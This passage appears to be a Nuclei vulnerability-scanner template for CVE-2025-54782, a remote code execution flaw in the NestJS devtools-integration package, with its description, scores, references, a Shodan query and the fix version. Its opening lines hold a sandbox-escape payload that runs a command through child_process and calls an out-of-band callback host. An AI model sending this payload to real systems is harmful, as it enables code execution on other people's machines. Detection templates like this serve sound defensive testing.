    process'')().mainModule.require(''child_process'').execSync(''nslookup {{interactsh-url}}'')}})()"}

    '
id: CVE-2025-54782
info:
  author: nukunga
  classification:
    cve-id: CVE-2025-54782
    cvss-metrics: CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
    cvss-score: 9.4
    cwe-id: CWE-77,CWE-352,CWE-78
    epss-percentile: 0.95966
    epss-score: 0.24363
  description: 'Nest is a framework for building scalable Node.js server-side applications.
    In versions 0.2.0 and below, a critical Remote Code Execution (RCE) vulnerability
    was discovered in the @nestjs/devtools-integration package. When enabled, the
    package exposes a local development HTTP server with an API endpoint that uses
    an unsafe JavaScript sandbox (safe-eval-like implementation). Due to improper
    sandboxing and missing cross-origin protections, any malicious website visited
    by a developer can execute arbitrary code on their local machine. The package
    adds HTTP endpoints to a locally running NestJS development server. One of these
    endpoints, /inspector/graph/interact, accepts JSON input containing a code field
    and executes the provided code in a Node.js vm.runInNewContext sandbox.

    '
  impact: 'Malicious websites visited by developers can execute arbitrary code on
    their local machine through the unprotected /inspector/graph/interact endpoint
    due to improper sandboxing.

    '
  metadata:
    max-request: 1
    shodan-query: devtools.nestjs.com
    verified: true
  name: NestJS DevTools Integration - Remote Code Execution
  reference:
  - https://socket.dev/blog/nestjs-rce-vuln
  - https://github.com/nestjs/nest/security/advisories/GHSA-85cg-cmq5-qjm7
  - https://nvd.nist.gov/vuln/detail/CVE-2025-54782
  remediation: This is fixed in version 0.2.1.
  severity: critical
  tags: cve,cve2025,nestjs,rce,sandbox,devtool,unauth,vkev,vuln
